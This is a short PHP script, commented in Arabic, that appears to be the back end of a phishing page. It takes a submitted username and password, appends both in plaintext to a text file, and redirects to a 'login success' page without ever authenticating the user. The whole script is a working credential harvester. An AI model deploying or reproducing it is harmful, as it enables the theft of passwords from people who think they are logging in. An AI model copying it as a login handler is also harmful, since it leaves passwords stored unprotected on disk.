<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    // افتح ملفًا للكتابة
    $file = fopen("login_data.txt", "a");
    
    // كتابة بيانات تسجيل الدخول إلى الملف
    fwrite($file, "Username: " . $username . "\nPassword: " . $password . "\n\n");
    
    // إغلاق الملف
    fclose($file);
    
    // تحويل المستخدم إلى صفحة تأكيد
    header("Location: login_success.html");
    exit();
}
?>
